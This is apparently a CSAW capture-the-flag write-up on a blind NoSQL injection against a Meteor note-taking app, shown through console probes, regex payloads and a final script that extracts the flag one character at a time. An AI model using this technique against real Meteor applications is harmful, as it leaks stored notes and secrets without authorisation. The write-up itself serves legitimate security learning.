---
title: "securinotes"
date: 2022-08-14T14:28:16-04:00
draft: false
authors: ["CDT Daniel Chung", "CDT Jalen Morgan"] 
tags: ["csaw", "web"]
---

A meteor vulnerability found in 2019 and using a note storage webpage as your password database...

## Description

You have access to the SecuriNotes application. You overheard your coworker Terry talking about how he uses it as a password manager. What could possibly go wrong...

Author: h34d4ch3, RangeForce

http://web.chal.csaw.io:5002


## TL;DR

Webpage is running meteor, meteor has known blind nosql injection vulnerability. Exploit using web console and get flag.

## Explanation

https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01

```
Meteor.call("notes.add", {}, console.log)
// creates new note and returns -> jELNgdCZxJoZm6TvL
Meteor.call("notes.count", {"_id": "jELNgdCZxJoZm6TvL"}, console.log)
// returns -> 1
```

you're basically writing a js nosql injection to run in your console

testing stuff here
```
Meteor.call("users.count", {
    "username": "terry",
    "role": {$regex: '^[a-m].*'}
}, console.log);


Meteor.call("notes.count", {}, console.log)
undefined
undefined 43774

Meteor.call("notes.count", {"_id":"vvfsYsjzuEP2BsSye"}, console.log)

Meteor.call("notes.count", {"_id":"vvfsYsjzuEP2BsSye"}, console.log)
undefined
undefined 1

Meteor.call("notes.count", {"_id":{$regex: '^[a-zA-Z0-9].*'}}, console.log)
undefined
undefined 9756

Meteor.user()
Object { _id: "cChso3FdudJHBCyg8", username: "f0ur3y3s@gmail.com" }

Meteor.call("notes.find", {"_id":"vvfsYsjzuEP2BsSye"}, console.log)
undefined
undefined 1

Meteor.call("notes.count", {"_id":{$regex: '^[a-zA-Z0-9].*'}}, console.log)
undefined
undefined 43974 meteor.js:1234:22
Meteor.call("notes.count", {}, console.log)
undefined
undefined 43975
```

find the id is the main part

originally thought that finding the id of terry was what we needed\
but thats not going to work because we dont know his username

```
Meteor.call('notes.count', {'body': 'flag'}, (err, res))
```

Looking into app.js, we can see this function defined:

```
Template.Layout_login.onCreated(function () {
  var self = this;
  this.notescount = new ReactiveVar(0);

  function noteCountUpdater() {
    Meteor.call('notes.count', {
      body: {
        $ne: ''
      }
    }, function (err, res) {
      //console.log(res)
      self.notescount.set(res);
    });
```


```
Meteor.call('users.count', (err, res) => {
  console.log(res);
});
```

https://book.hacktricks.xyz/pentesting-web/nosql-injection


https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split
use an index from the string ` abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_`

```
' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split('')
Array(66) [ " ", "{", "}", "_", "0", "1", "2", "3", "4", "5", … ]
```

https://stackoverflow.com/questions/21824244/mongodb-regex-searching-issue-in-meteor
regex searching, we are searching for `flag{` + a character from our alphabet list

https://www.w3schools.com/jsref/met_win_settimeout.asp
set timeout

https://www.netsparker.com/blog/web-security/what-is-nosql-injection/

https://www.google.com/search?client=firefox-b-1-d&q=meteor+js+nosql+injection

https://www.neuralegion.com/blog/blind-sql-injection/

https://owasp.org/www-community/attacks/Blind_SQL_Injection

https://book.hacktricks.xyz/pentesting-web/nosql-injection


## Final Script

(function exploit(field, alphabet, data = '', index = 0){
    Meteor.call('notes.count', {[field]: {$regex: data + alphabet[index]}}, (err, res) => {
        if (res == 0){
            index++;
        } 
        else {
            data += alphabet[index];
            console.log(data, res);
            index = 0;
        }
        if (index >= alphabet.length) {
            console.log("Done", data);
            return;
        }
        setTimeout(function(){exploit(field, alphabet, data, index);});
    });
})
('body', ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split(''), 'flag{');

## How does it work?

- calls the notes.count function to check if the substring we have is equal to flag{. 
- we start off with the alphabet and our string as flag{. 
- we check if res==0 then we increase our index in the alphabet going to the next letter. 
- if its 1 then we add the letter to our flag{ string and print it out. 
- the alph len check is to prevent out of bounds errors. 
- the timeout sets the loop which is a js thing

![exploit](/img/meteorexploit.JPG)

## Flag

flag{4lly0Urb4s3}


